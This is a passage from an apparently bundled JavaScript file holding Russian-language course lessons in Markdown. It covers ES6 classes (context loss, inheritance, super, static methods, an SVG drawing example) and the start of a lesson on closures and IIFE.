присваивания, ^^\n^^т.е. сработал сеттер, который отфильтровал входной массив^^\n\n^^![ico-20 speach] Попробуем выполнить присваивание, передавая некорректные значения:^^\n\n~~~js\npict.history = ['***']\n~~~\n\n**Результат - исключение:**\n\n••![ico-20 error] History must contain path array••\n\n~~~js\npict.history = true\n~~~\n\n**Результат - исключение:**\n\n••![ico-20 error] History must be array••\n\n^^![ico-20 speach] Значение свойства  **_history_**  не изменилось, ^^\n^^а в консоль были выданы соответствующие сообщения об ошибке^^\n\n________________________________________________________\n\n## ![ico-25 icon] Потеря контекста\n\n![ico-20 pin] В строгом режиме не происходит неявной передачи контекста вызова\n\n![ico-20 warn] Потеря контекста происходит всегда, если ссылка на метод передается в новую переменную:\n\n◘◘![ico-25 cap] **Пример 7**◘◘\n\n~~~js\nconst drawLine = pict.drawLine\n\ndrawLine([{ x: 50, y: 50 }, { x: 250, y: 250 }])\n~~~\n\nбудет сгенерировано исключение:\n\n••![ico-20 error] Uncaught TypeError: Cannot read property 'area' of undefined••\n\nПередачу контекста вызова нужно сделать явным образом:\n\n~~~js\nconst drawLine = pict.drawLine.bind(pict)\n~~~\n\n![ico-20 pin] ^^Потеря контекста ( ~undefined~ ) происходит вследствие того, что весь код внутри тела класса выполняется в  **_strict mode_**, хотя явного указания  'use strict'  в коде класса нет^^\n^^При отсутствии явного указания на объект, вызывающий метод, ^^\n^^в строгом режиме ~this~ не будет ссылкой на глобальный объект ~window~^^\n^^В строгом режиме ~this~ будет  ~undefined~\n\n______________________________________________________\n\n◘◘![ico-25 cap] **Пример 8**◘◘\n\n~~~js\nclass User {\n  constructor (name) {\n    this.name = name || 'unknown'\n  }\n\n  addSomeInfo (props) {\n    if (!Array.isArray(props)) return\n\n    function getProp (prop) {\n      this[prop.name] = prop.value\n    }\n\n    for (const prop of props) {\n      getProp(prop)\n    }\n  }\n}\n~~~\n\n^^В этом примере контекст теряется в функции **_getProp()_**,  объявленной внутри метода **_addSomeInfo_**^^\n^^(внутренняя функция не наследует контекст вызова родительской)^^\n^^Создадим экземпляр **user** класса **User** и вызовем метод **_addSomeInfo_** в контексте объекта **user**^^\n\n~~~js\nvar user = new User('Grig')\nuser.addSomeInfo([\n  { name: 'age', value: 25 },\n  { name: 'hobby', value: ['football', 'fishing'] }\n])\n~~~\n\n**Результат**\n\n••![ico-20 error] Uncaught TypeError: Cannot set property 'age' of undefined••\n\n^^![ico-20 yes] Внутри функции **_getProp_** контекст вызова ( **~this~** ) оказался ~undefined~^^\n\n^^Теперь используем стрелочную функцию **_getProp_**, которая не теряет контекст ![ico-20 smile]^^\n\n~~~js\nclass User {\n  constructor (name) {\n    this.name = name || 'unknown'\n  }\n\n  addSomeInfo (props) {\n    if (!Array.isArray(props)) return\n\n    props.forEach(prop => prop && prop.name && Object.assign(this, { [prop.name]: prop.value }))\n  }\n}\n~~~\n\n^^Создадим экземпляр **user** и вызовем метод **_addSomeInfo_**^^\n\n~~~js\nconst user = new User('Grig')\n\nuser.addSomeInfo([\n  { name: 'age', value: 25 },\n  { name: hobby, value: ['football', 'fishing'] },\n  {},\n  54,\n  null\n])\nconsole.log(user)\n~~~\n\n◘◘**Результат**◘◘\n\n~~~console\n\n▼ User {name: \"Grig\", age: 25, hobby: Array(2)}\n    age: 25\n  ► hobby: (2) [\"football\", \"fishing\"]\n    name: \"Grig\"\n  ▼ __proto__:\n      ► addSomeInfo: addSomeInfo ( props ) { if ( !Array.isArray ( props ) ) return var getProp = prop => {…}\n      ► constructor: class User\n      ► __proto__: Object\n~~~\n\n________________________________________________________\n\n## ![ico-25 icon] Наследование\n\n### ![ico-20 icon] extends\n\nКлючевое слово **~extends~** используется для создания дочернего класса\nФактически мы передаем с помощью **~extends~** ссылку на прототип\n\n^^Объявим класс **Provider**^^\n\n◘◘![ico-25 cap] **Пример 9**◘◘\n\n~~~js\nclass Provider extends Array {\n  constructor () {\n    super();\n    ['Google', 'Mozilla', 'Opera', 'Safari', 'IE']\n      .forEach((item, index) => { this[index] = item })\n  }\n\n  valueOf () {\n    return this.length\n  }\n}\n~~~\n\n^^Обратите внимание, что в конструкторе класса первым делом с помощью **super()** мы вызываем конструктор родительского класса^^\n\n^^Создадим экземпляр класса **Provider**^^\n\n~~~js\nlet provider = new Provider\n~~~\n\n^^Посмотрим на цепочку прототипов ^^\n\n◘◘provider◘◘\n\n~~~console\n\n▼ Provider(5) [\"Google\", \"Mozilla\", \"Opera\", \"Safari\", \"IE\"]\n    0: \"Google\"\n    1: \"Mozilla\"\n    2: \"Opera\"\n    3: \"Safari\"\n    4: \"IE\"\n    length: 5\n  ▼ __proto__: Array\n      ► constructor: class Provider\n      ► valueOf: ƒ valueOf()\n      ► __proto__: Array(0)\n~~~\n\n^^Теперь протестируем экземпляр:^^\n\n~~~js\nprovider instanceof Provider  // true\nprovider instanceof Array     // true\n\nprovider + 5   // 10\nprovider * 3   // 15\n~~~\n\n______________________________\n\n◘◘![ico-25 cap] **Пример 10**◘◘\n\n~~~js\nconst Canvas = class {\n  constructor () {\n    this.canvas = document.body\n      .appendChild(document.createElement('canvas'))\n    this.canvas.height = '400'\n    this.area = this.canvas.getContext('2d')\n  }\n\n  drawLine (points) {\n    this.area.beginPath()\n    this.area.moveTo(points[0].x, points[0].y)\n    this.area.lineTo(points[1].x, points[1].y)\n    this.area.stroke()\n  }\n}\n\nclass ExtendedCanvas extends Canvas {\n  drawCircle (center, radius) {\n    this.area.beginPath()\n    this.area.arc(center.x, center.y, radius, 0, 2 * Math.PI)\n    this.area.stroke()\n  }\n}\n\nlet newCanvas = new ExtendedCanvas()\nnewCanvas.drawCircle({ x: 100, y: 100 }, 100)\nnewCanvas.drawLine([{ x: 20, y: 20 }, { x: 300, y: 400 }])\n~~~\n\n^^![ico-20 speach] Обратите внимание, что метод **_~drawCircle()~_** находится в прототипе экземпляра^^\n^^( что логично, поскольку это унаследованный метод )^^,\n^^а метод **_~drawLine()~_** родительского класса  **Canvas** находится в прототипе прототипа ^^\n^^( что соответствует прототипной модели наследования - мы получили цепочку прототипов )^^\n\n________________________________________________________\n\n### ![ico-20 icon] super\n\nМетоды родительского класса доступны в дочернем классе посредством ключевого слова **~super~**\n\n^^![ico-20 speach] Расширим унаследованный метод **~drawLine()~**  родительского класса, добавив аргумент **_~lineWidth~_**  ( толщину линии )^^\n\n^^![ico-20 speach] Для этого определим \"расширенный\" метод  ~drawLine()~ внутри дочернего класса,^^\n^^который будет вызывать  метод  ~drawLine()~ родительского класса^^\n^^с помощью ключевого слова **super**:^^\n\n~~~js\nsuper.drawLine(points, lineColor)\n~~~\n\n^^Теперь код будет таким:^^\n\n◘◘![ico-25 cap] **Пример 11**◘◘\n\n~~~js\nconst Canvas = class {\n  constructor () {\n    this.canvas = document.body\n      .appendChild(document.createElement('canvas'))\n    this.canvas.style.border = '1px solid #ddd'\n    this.area = this.canvas.getContext('2d')\n  }\n\n  drawLine (points) {\n    this.area.beginPath()\n    this.area.moveTo(points[0].x, points[0].y)\n    this.area.lineTo(points[1].x, points[1].y)\n    this.area.stroke()\n  }\n}\n\nclass ExtendedCanvas extends Canvas {\n  drawLine (points, lineColor, lineWidth) {\n    this.area.lineWidth = lineWidth || 3\n    this.area.strokeStyle = lineColor\n    super.drawLine(points)\n  }\n}\n~~~\n\n^^![ico-20 speach] Создадим экземпляр дочернего класса:^^\n\n~~~js\nlet newCanvas = new ExtendedCanvas()\n~~~\n\n^^![ico-20 speach] и вызовем его метод  **~drawLine()~**^^\n\n~~~js\nnewCanvas.drawLine([{ x: 20, y: 20 }, { x: 300, y: 400 }], '#ffaa00', 10)\n~~~\n\n^^![ico-20 speach] Теперь линия будет отрисовываться заданной толщины^^\n\n____________________________________________\n\n### ![ico-20 icon] super ()\n\nВ предыдущих примерах мы не использовали конструктор наследующего класса\n\n![ico-20 warning] Когда нужно добавить собственные свойства экземпляру наследующего класса, без конструктора это сделать невозможно\n\n![ico-20 warning] Первое, что нужно выполнить в конструкторе наследующего класса - вызвать метод **super()**\n\n◘◘![ico-25 cap] **Пример 12**◘◘\n\n~~~js\nconst Canvas = class {\n  constructor () {\n    this.canvas = document.body\n      .appendChild(document.createElement('canvas'))\n    this.area = this.canvas.getContext('2d')\n  }\n  drawLine (points) {\n    this.area.beginPath()\n    this.area.moveTo(points[0].x, points[0].y)\n    this.area.lineTo(points[1].x, points[1].y)\n    this.area.stroke()\n  }\n}\n\nclass ExtendedCanvas extends Canvas {\n  constructor () {\n    super ()\n    this.history = []\n  }\n}\n~~~\n\nВ противном случае будет сгенерировано исключение:\n\n••![ico-20 error] Uncaught ReferenceError: ••\n•• Must call super constructor in derived class before accessing 'this' or returning from derived constructor••\n\n_________________________________________________________\n\n### ![ico-20 icon] super в литералах объектов\n\nКлючевое слово  **~super~**  можно использовать без объявления классов\n**~super~** является ссылкой на прототип объекта\nПоэтому можно использовать его для доступа к свойствам и методам объекта-прототипа\n\n••![ico-30 speach] _В примерах далее мы будем использовать объекты, объявленные в литеральной форме_••\n\n^^В качестве прототипа объекта  **person**  будет выступать объект  **human**^^\n^^Назначать объект  **human**  прототипом объекта  **person** мы будем с помощью метода^^\n\n~~~js\nObject.setPrototypeOf(person, human)\n~~~\n\n^^После такого назначения внутри объекта  **person** свойства и методы объекта  **human** будут доступны с помощью ключевого слова  **~super~**^^\n\n^^![ico-20 speach] В следующем примере вызовем методы  **_~place()~_**  и  **_~say()~_** прототипа **human**^^\n^^в методах   **_~getPlace()~_**  и  **_~talk()~_** объекта  **person** ^^\n^^с помощью ключевого слова **~super~** :^^\n\n◘◘![ico-25 cap] **Пример 13**◘◘\n\n~~~js\nconst human = {\n  place () {\n    return Object.assign(document.body.appendChild(document.createElement('p')), {\n      id: 'demo'\n    })\n  },\n  say (text) {\n    this.place.innerHTML = text\n  }\n}\n\nconst person = {\n  getPlace () { this.place = super.place () },\n  talk (text) {\n    super.say(text)\n  }\n}\n\nObject.setPrototypeOf(person, human)\nperson.getPlace()\nperson.talk('привет!')\n~~~\n\n__________________________________________________\n\n◘◘![ico-25 cap] **Пример 14**◘◘\n\n~~~js\nconst human = {\n  place: () =>\n    document.getElementById('demo')\n      ? document.getElementById('demo')\n      : document.body.appendChild(document.createElement('p')).id = 'demo',\n\n    say (text) {\n      this.place.innerHTML = text\n    }\n}\n\nlet person = {\n  getPlace () {\n    this.place = super.place()\n  },\n  talk (text) {\n    this.getPlace()\n    super.say(text)\n  }\n}\n\nObject.setPrototypeOf(person, human)\n\nperson.talk('привет!')\nsetTimeout(() => person.talk('Hello, baby!'), 2000)\n~~~\n\n![ico-20 speach] ^^В этом примере метод  **~place()~**  прототипа  (объекта  **human**) проверяет наличие элемента с  ••id === \"demo\"••^^\n^^и если такой элемент найден, возвращает ссылку на него, ^^\n^^в противном случае создает такой элемент, добавляет его на страницу^^\n\n![ico-20 speach] ^^Объект  person  изначально не имеет свойства  **_place_**,^^\n^^но имеет собственный метод  **~getPlace()~**, который создает такое свойство,  ^^\n^^вызывая с помощью ключевого слова  **~super~** метод **~place()~**  прототипа  (объекта  **human**), ^^\n^^и присваивая возвращенное этим методом значение собственному свойству  **~place~**^^\n\n![ico-20 speach] ^^Метод  **~talk(_text_)~**  объекта  **person**^^\n^^вызывает метод  **~getPlace()~**^^\n^^до вызова метода **~say()~**  ^^\n^^прототипа  (объекта  **human**)^^\n\n![ico-20 speach] ^^Обратите внимание, что при объявлении метода   **~place()~**  объекта  **human** ^^\n^^мы использовали стрелочную функцию, ^^\n^^а при объявлении метода  **~say()~**  ее использовать нельзя, ^^\n^^поскольку внутри методов, объявленных с помощью стрелочных функций, ^^\n^^контектом вызова будет глобальный объект^^\n\n______________________________________________________\n\n◘◘![ico-25 cap] **Пример 15**◘◘\n\n~~~js\nconst human = {\n  place: (() => {\n    const elem = document.getElementById('demo')\n    return elem || Object.assign(document.body.appendChild(document.createElement('p')), {\n      id: 'demo'\n    })\n  })(),\n\n  say (text) {\n    this.place.innerHTML = text\n  }\n}\n\nlet person = {\n  talk ( text ) {\n    this.say(text)\n  }\n}\n\nObject.setPrototypeOf(person, human)\nperson.talk('привет!')\nsetTimeout(() => person.talk('Hello, baby!'), 2000)\n~~~\n\n^^В этом примере свойство  **_place_**  прототипа (объекта  **human**) ^^\n^^уже не является методом^^\n^^Его значение ( ссылка на элемент ) ^^\n^^будет установлено при инициализации объекта  **human**^^\n\n^^В этом примере демонстрируется взаимозаменяемость ключевых слов  **~super~**  и  **~this~** ^^\n^^при  ссылках на свойства прототипа^^\n\n![ico-20 speach] ^^Метод   **_talk()_**  объекта  **person** ^^\n^^вызывает  метод  **_say ()_**  прототипа^^\n^^без ключевого слова  **~super~**^^\n^^(с ключевым словом  **~this~**)^^\n\n![ico-20 speach] ^^Когда метод  **_say()_**  в объекте  **person**  не будет найден, ^^\n^^поиск будет продолжен в прототипе, ^^\n^^где и будет благополучно найден^^\n\n![ico-20 speach] ^^Внутри метода   **_say ()_**, вызванного из метода **_talk ()_**, ^^\n^^контекстом вызова будет объект  **person**^^\n^^(т.е.  **~this~**  будет  указывать на объект  person)^^\n^^но тем не менее ссылка   **~this._place_~**  ^^\n^^будет благополучно разрешена по цепочке прототипов^^\n\n![ico-20 speach] ^^Если же имена свойств  объекта и его прототипа совпадают, ^^\n^^и нужно вытянуть именно свойство прототипа, ^^\n^^а не собственное свойство объекта, ^^\n^^то для унаследованных свойств можно использовать  ~__proto__~^^\n\n~~~js\nconst person = {\n  say (text) {\n    console.log(text)\n  },\n  talk (text) {\n    this.__proto__.say(text)\n  }\n}\n~~~\n\n![ico-20 speach] ^^Очевидно, в таком случае код:\n\n~~~js\nsuper.say(text)\n~~~\n\nкороче, чем\n\n~~~js\nthis.__proto__.say(text)\n~~~\n\nа результат идентичный ![ico-20 smile]\n\n______________________________________________________________\n\n◘◘![ico-25 cap] **Пример 16**◘◘\n\n~~~~js\nconst human = {\n  id: '',\n  get place () {\n    if (this.id) return document.getElementById(this.id)\n  },\n  set place (newId) {\n    this.id = newId\n    document.getElementById(this.id) ||\n      Object.assign(document.body.appendChild(document.createElement('p')), {\n        id: this.id\n      })\n    },\n    get message () {\n      return this.place.innerText\n    },\n    set message (val) {\n      this.place.innerText = val\n    }\n}\n\nconst person = {\n  talk (text) {\n    super.message = text\n  },\n  get place () {\n    return super.place\n  },\n  set place (newId) {\n    super.place = newId\n  }\n}\n\nObject.setPrototypeOf(person, human)\nperson.place = 'demo-1'\nperson.talk('привет!')\nperson.place = 'demo-2'\nsetTimeout(() => person.talk('Hello, baby!'), 2000)\n~~~~\n\n![ico-20 speach] ^^В этом примере мы используем геттеры и сеттеры свойств объектов^^\n^^Для вычисляемых свойств это наиболее корректный способ доступа к их значениям^^\n\n________________________________________________________\n\n## ![ico-25 icon] static\n\nСтатические методы класса объявляются с помощью ключевого слова **static**\n\n![ico-20 warn] Эти методы могут быть вызваны только как методы класса\n\n![ico-20 warn] Внутри статического метода ~this~ указывает на конструктор класса, а не на экземпляр\n\n◘◘![ico-25 cap] **Пример 17**◘◘\n\n~~~js\nclass Canvas {\n  constructor () {\n    this.canvas = document.body.appendChild(document.createElement('canvas'))\n    Canvas.resizeCanvas.call(this.canvas)\n    this.canvas.style.border = \"1px solid #000000\"\n    this.area = this.canvas.getContext ( \"2d\" )\n  }\n\n  static resizeCanvas (event) {\n    this.width = window.innerWidth - 30\n    this.height = window.innerHeight - 20\n  }\n\n  static drawLine (context, points) {\n    context.area.moveTo(points[0].x, points[0].y)\n    context.area.lineTo(points[1].x, points[1].y)\n    context.area.stroke()\n  }\n}\n\nlet pict = new Canvas()\nwindow.onresize = Canvas.resizeCanvas.bind(pict.canvas)\nCanvas.drawLine(pict, [{ x: 50, y: 50 }, { x: 250, y: 250 }])\nCanvas.drawLine(pict, [{ x: 250, y: 250 }, { x: 100, y: 250 }])\n~~~\n\n![ico-20 pin] Обратите внимание, что статические методы **_~resizeCanvas~_** и **_~drawLine~_**\nвызываются как методы класса **Canvas**:\n\n~~~js\nCanvas.resizeCanvas\nCanvas.drawLine\n~~~\n\n![ico-20 pin] Внутри конструктора  ~this~  указывает  на экземпляр\n\nВ этом примере для того, чтобы внутри метода ~this~ указывал на объект **canvas** экземпляра,\nвызов метода  **_resizeCanvas_** из конструктора происходит с передачей контекста:\n\n~~~js\nCanvas.resizeCanvas.call(this.canvas)\n~~~\n\nи когда этот метод используется в качестве обработчика события **_~resize~_** объекта  **~window~**,\nто выполняется явная привязка контекста:\n\n~~~js\nwindow.onresize = Canvas.resizeCanvas.bind(pict.canvas)\n~~~\n\nПри вызове статического метода  **_~drawLine~_**  первым аргументом ему передается контекст вызова\n\n![ico-20 pin] Примечание:\n\n^^В данном случае объявление метода  **~drawLine~**  как статического^^\n^^создает ненужные сложности с передачей контекста, ^^\n^^и гораздо проще объявить его так:^^\n\n~~~js\ndrawLine (points) {\n  this.area.moveTo(points[0].x, points[0].y)\n  this.area.lineTo(points[1].x, points[1].y)\n  this.area.stroke()\n}\n~~~\n\n^^чтобы контекстом вызова был экземпляр, создаваемый конструктором^^\n\n\n________________________________________________________\n\n◘◘![ico-25 cap] **Пример 18**◘◘\n\n~~~js\nclass Canvas {\n  constructor () {\n    this.canvas = document.body.appendChild(document.createElement('canvas'))\n    Canvas.resizeCanvas ()\n  }\n\n  static resizeCanvas (event) {\n    console.log(`name: '${this.name}'`)\n  }\n}\n\nvar pict = new Canvas()\nwindow.onresize = Canvas.resizeCanvas\n~~~\n\nКогда метод **_~resizeCanvas()~_** будет вызван из конструктора, он выведет в консоль:\n\n••name: \"Canvas\"••\n\nИзмените размер окна браузера\nТеперь метод  **_~resizeCanvas()~_**  будет вызван в глобальной области видимости,\nи в консоль будет выведено:\n\n••name: \"\"••\n\nпоскольку  ~this~  внутри **_~resizeCanvas()~_** теперь указывает\nна глобальный объект  (~window~)\n\n____________________________________________________________________\n\n\n## ![ico-25 cap] Пример\n\nВ этом примере мы будем работать с графикой [svg](external/svg)\n\n#### ![ico-20 icon] createElementNS()\n\n![ico-20 warn] Для динамического создания элементов SVG нужно использовать метод **~createElementNS()~**\nс указанием ссылки на пространство имен ( **_NS_** )\n\nЭто необходимо для того, чтобы браузер правильно понимал и отображал _svg_-элементы\n\nSVG - это тип XML-разметки, который имеет собственное пространство имен, которое может быть встроено в HTML5\n\n![ico-20 green-ok] Первым аргументом метода  **~createElementNS()~** идет ссылка на пространство имен\n( ~http://www.w3.org/2000/svg~ )\n![ico-20 green-ok] Второй аргумент - имя тега элемента в этом пространстве имен\n\n![ico-20 warn] Если использовать обычный метод  ~createElement()~, то браузер будет интерпретировать его в пространстве имен  HTML\n( по умолчанию )\n\n![ico-20 warn] Для корректной работы svg-элементов нужно, чтобы браузер интерпретировал их в пространстве имен SVG\n\n^^Например, чтобы корректно создать контейнер для  svg-графики:^^\n\n~~~js\ndocument.createElementNS('http://www.w3.org/2000/svg', 'svg')\n~~~\n\n**Проверим в консоли:**\n\n~~~js\nconst svg = document.createElement('svg')\nconsole.log(svg.namespaceURI)  // \"http://www.w3.org/1999/xhtml\"\n\nconst picture = document.createElementNS('http://www.w3.org/2000/svg', 'svg')\nconsole.log(picture.namespaceURI)  // \"http://www.w3.org/2000/svg\"\n~~~\n\n**Valid Namespace URIs:**\n\n![ico-20 green-ok] **HTML** - http://www.w3.org/1999/xhtml\n![ico-20 green-ok] **SVG** - http://www.w3.org/2000/svg\n\n_______________________________________\n\n#### ![ico-20 icon] Базовый класс\n\nСоздадим класс  **DrawFigures**, который будет создавать  элемент  svg\nс двумя методами:   **_setSize()_**  и  **~drawFigure()~**\n\n![ico-20 speach] Метод **~setSize()~** будет изменять размеры элемента  svg\n![ico-20 speach] Метод **~drawFigure()~** будет добавлять элементы в контейнер  svg\n\n^^Имя элемента будет передано первым аргументом метода  (figure)^^\n^^возможные значения  \"line\", \"circle\", \"path\", \"rect\" и т.д.^^\n^^Параметры фигуры будут переданы вторым аргументом метода (params)^^\n\n![ico-20 speach] Поскольку у каждого элемента  svg  свой набор атрибутов, создаем свойство  **~attrs~** (объект), свойства которого будут именами svg-элементов, а значения - массивом атрибутов каждого svg-элемента\n\nПри создании svg-элемента его атрибуты будут установлены с помощью метода  **~setAttribute()~**\n\n~~~js\nconst DrawFigures = class SVG {\n  constructor (w, h) {\n    this.canvas = document.createElementNS('http://www.w3.org/2000/svg', 'svg')\n    document.body.appendChild(this.canvas)\n    this.setSize(w, h)\n    this.attrs = {\n      line: ['x1', 'y1', 'x2', 'y2'],\n      circle: ['cx', 'cy', 'r']\n    }\n  }\n\n  setSize (w, h) {\n    this.canvas.setAttribute ('width', w)\n    this.canvas.setAttribute ('height', h)\n  }\n\n  drawFigure (figure, params) {\n    const elem = document.createElementNS('http://www.w3.org/2000/svg', figure)\n    this.canvas.appendChild(elem)\n    for (const attr of this.attrs[figure]) {\n      elem.setAttribute(attr, params[attr])\n    }\n    return elem\n  }\n}\n~~~\n\nПротестировать работу класса можно так:\n\n~~~js\nconst sample = new DrawFigures(300, 300)\nsample\n  .drawFigure('line', { x1: 10, y1: 20, x2: 250, y2: 250 })\n  .setAttribute ('stroke', 'red')\n~~~\n\n![ico-20 speach] Вызов метода   **~drawFigure()~** создаст элемент &lt;line> и вернет ссылку на него,\nно этот элемент не отобразится на странице, поскольку в массиве  **~attrs.line~**\nнет атрибута \"~stroke~\", задающего цвет линии\n\n![ico-20 speach] Чтобы увидеть этот элемент на странице, нам приходится устанавливать значение атрибута ~stroke~\nпосле вызова метода **_drawFigure()_**:\n\n~~~js\nsetAttribute('stroke', 'red')\n~~~\n\n![ico-20 speach] Теперь можно рисовать и другие фигуры, и настраивать их атрибуты:\n\n~~~js\nconst circle = sample.drawFigure('circle', { cx: 180, cy: 180, r: 150 })\ncircle.setAttribute('stroke', 'blue')\ncircle.setAttribute('fill', 'transparent')\nsample.setSize(400, 400)\ncircle.setAttribute('stroke-width', 8)\n~~~\n\n[![ico-25 cap] Пример](samples/18)\n\n_____________________________________________________\n\n#### ![ico-20 icon] Дочерний класс\n\n![ico-20 speach] Теперь создадим дочерний класс  **ColoredFigures**,\nрасширяющий функционал родительского класса  **DrawFigures**\nпутем добавления атрибутов линий и заливки фигур\n(\"~stroke~\", \"~style~\", \"~fill~\")\nи метода удаления элемента  **_erase_**\n\n![ico-20 speach] В конструкторе дочернего класса вызовем метод **~super()~**,\nчтобы был создан контейнер &lt;svg> с нужными размерами,\nи объявим свойство экземпляра  **~figures~**\n\n![ico-20 speach] Метод **~super()~** должен быть вызван первым в конструкторе,\nпоскольку до его вызова  значение  `this`  не будет определено\nвнутри конструктора\n\n![ico-20 speach] Кроме того, расширим функционал базового класса  **DrawFigures**,\nдобавив атрибуты  \"~stroke~\",  \"~style~\"  и  \"~fill~\"\nэто мы тоже сделаем в конструкторе класса  **ColoredFigures**\n\n~~~js\nclass ColoredFigures extends DrawFigures {\n  constructor () {\n    super(window.innerWidth - 20, window.innerHeight - 20)\n    this.figures = []\n    for (const attr in this.attrs) {\n      this.attrs[attr].push('stroke', 'style', 'fill')\n    }\n  }\n\n  line (params, line) {\n    this.draw('line', params)\n  }\n\n  circle (params, line, fill) {\n    this.draw('circle', params)\n  }\n\n  draw (figure, params) {\n    if (params.strokeWidth) {\n      Object.assign(params, {\n        style: `stroke-width: ${ params.strokeWidth }`\n      })\n      delete params.strokeWidth\n    }\n    this.figures.push(this.drawFigure(figure, params))\n  }\n\n  erase (figureIndex) {\n    if (figureIndex > this.figures.length - 1 || figureIndex < 0) return\n    this.figures[figureIndex].remove()\n    this.figures.splice(figureIndex, 1)\n  }\n}\n~~~\n\n![ico-20 speach] Проверим, как работает расширенный класс  **ColoredFigures**\n\n~~~js\nconst canvas = new ColoredFigures(400, 500)\n\ncanvas.line({\n  x1: 10,\n  y1: 250,\n  x2: 250,\n  y2: 50,\n  stroke: 'green',\n  strokeWidth: 5\n})\ncanvas.circle({\n  cx: 150,\n  cy: 150,\n  r: 100,\n  fill: '#ff00ff90',\n  stroke: '#909',\n  strokeWidth: 10\n})\n~~~\n\n![ico-20 speach] Конечно, мы можем создавать элементы, обращаясь к методу базового класса  **~drawFigure()~**:\n\n~~~js\ncanvas.drawFigure('line', {\n  x1: 200,\n  y1: 150,\n  x2: 50,\n  y2: 100,\n  stroke: 'blue',\n  style: 'stroke-width: 10'\n})\n~~~\n\n![ico-20 speach] но тогда созданные svg-элементы не попадут в массив  **~figures~**\nи их нельзя будет удалить с помощью метода  **~erase()~**\n\n![ico-20 speach] Кроме того, вызов метода  **~line()~**  или  **~circle()~**  лаконичнее\n\n![ico-25 speach] Обратите внимание, что у класса  **ColoredFigures** есть свойство  prototype, которого нет ( и не может быть ) у экземпляра\nВ свойстве **~prototype~** класса **ColoredFigures** находятся методы **~circle()~**, **~line()~**, **~draw()~** и **~erase()~**\n\n![ico-25 speach] У класса ColoredFigures есть также свойство  **~__proto__~**\nэто ссылка на родительский класс **SVG**\n\n![ico-25 speach] У родительского класса, как и следовало ожидать, тоже есть свойство **~prototype~**,\nи в этом свойстве находятся методы **~drawFigure()~** и **~setSize()~**\n\n![ico-25 speach] Ни у класса **ColoredFigures**, ни у класса **SVG** нет свойств **~attrs~**, **~canvas~** и **~figures~**\nОни есть только у экземпляра этого класса\n\n________________________________________________________________\n\n[![ico-30 hw] Quiz](quiz/classes)\n"},36345:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Замыкание\n\n[Замыкание](external/w3-closures) - это эффект, с помощью которого можно \"скрыть\" переменные в контексте родительской функции, возвращающей функцию.\n\n[Замыкание](external/mdn-closures) - это комбинация: функция + лексическая среда, в которой эта функция была объявлена.\n\nЕсли функция возвращает функцию, то Lexical Environment родительской функции попадает в цепочку областей видимости дочерней функции.\n\nТ.е. все аргументы, полученные родительской функцией при вызове, а так же все переменные и функции, объявленные в ней, будут доступны дочерней функции (она их \"видит\")\n\n^^Однако больше нигде они доступны не будут, поскольку ссылки на них доступны только дочерней функции.^^\n\nИтак, эффект замыкания возникает только в том случае, если функция возвращает функцию.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nfunction parent (arg) {\n  var frog = 'I\\'m frog'\n  return function () {\n    console.log(arg, frog)\n  }\n}\n\nvar child = parent('Hello!')\n~~~\n\nВызовем дочернюю функцию:\n\n~~~js\nchild()  // Hello!  I'm frog\n~~~\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nvar parent = message => () => console.log(message)\n\nvar hello = parent('Hello!')\nvar welcome = parent('Welcome!')\n\nhello()    // Hello!\nwelcome()  // Welcome!\n~~~\n\nАльтернативой замыканию является другой механизм - карринг:\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nvar parent = message => console.log(message)\n\nvar hello = parent.bind(null, 'Hello!')\nvar welcome = parent.bind (null, 'Welcome!')\n\nhello()    // Hello!\nwelcome()  // Welcome!\n~~~\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\nfunction parent (omega) {\n  var alpha = 0\n  return () => omega > alpha\n    ? omega-- - alpha++\n    : null\n}\n\nvar child = parent(20)\n~~~\n\nТеперь каждый очередной вызов функции **child** будет возвращать новое число меньше предыдущего на 2\nи так до тех пор, пока возвращаемое значение больше 0\n\n~~~js\nchild() // 20\nchild() // 18\n...\n~~~\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nfunction first (firstArg) {\n  function second (secondArg) {\n    return firstArg.toString().split('').join(secondArg)\n  }\n  return function () {\n    return second('*')\n  }\n}\n\nfirst('Happy New Year!')()\n~~~\n\nРезультат будет: ••\"H*a*p*p*y* *N*e*w* *Y*e*a*r*!\"••\n\n_______________________\n\n## ![ico-25 icon] IIFE\n\n**_Immediately Invoked Function Expression_**\n\nФункциональное выражение [**IIFE**](external/mdn-iife), т.е. вызов объявляемой анонимной функции \"на месте\"\n(в месте ее объявления)\n\nВ этом примере анонимная функция \"завернута\" в круглые скобки:\n\n◘◘![ico-25 cap] ** 6**◘◘\n\n~~~js\n(function (userName) {\n  return {\n    name: userName,\n    visit: new Date().toLocaleDateString(),\n    id: new Date().getTime()\n  }\n})\n~~~\n\nКогда движок доходит до строки, в которой находится этот код, он вычисляет выражение в круглых скобках,\nи значением этого выражения будет **ссылка** на функцию, объявление которой находится в скобках.\n\n~~~console\nƒ (userName) {\n  return {\n    name: userName,\n    visit: new Date().toLocaleDateString(),\n    id: new Date().getTime()\n  }\n}\n~~~\n\nЕсли после этого функционального выражения поставить круглые скобки, то произойдет немедленный вызов функции в месте ее объявления:\n\n~~~js\n(function (userName) {\n  return {\n    name: userName,\n    visit: new Date().toLocaleDateString(),\n    id: new Date().getTime()\n    }\n})()\n~~~\n\nПоскольку объявленная внутри круглых скобок функция возвращает объект, то результат будет:\n\n~~~console\n▼ { name: undefined, visit: \"04.07.2019\", id: 1562225761228 }\n    id: 1562225761228\n    name: undefined\n    visit: \"04.07.2019\"\n  ► __proto__: Object\n~~~\n\nПоскольку полученную ссылку на функцию мы не сохраняем, то сборщик мусора при очередном проходе удалит объект функции из памяти.\nПоэтому внутри скобок объявляется анонимная функция, поскольку ее имя никогда не будет использовано.\n\nВызов функции без аргумента привел к тому, что свойство name объекта получило значение undefined\n\nПередадим функции аргумент, причем имя получим через модальное окно prompt:\n\n~~~js\nvar user = (function (userName) {\n  return {\n    name: userName,\n    visit: new Date().toLocaleDateString(),\n    id: new Date().getTime()\n  }\n})(prompt('Enter your name:'))\n~~~\n\nВ модальном окне введем имя **_Семен_**\n\nВ результате переменная user станет объектом:\n\n~~~console\n▼ { name: \"Семен\", visit: \"04.07.2019\", id: 1562226083644 }\n    id: 1562226083644\n    name: \"Семен\"\n    visit: \"04.07.2019\"\n  ► __proto__: 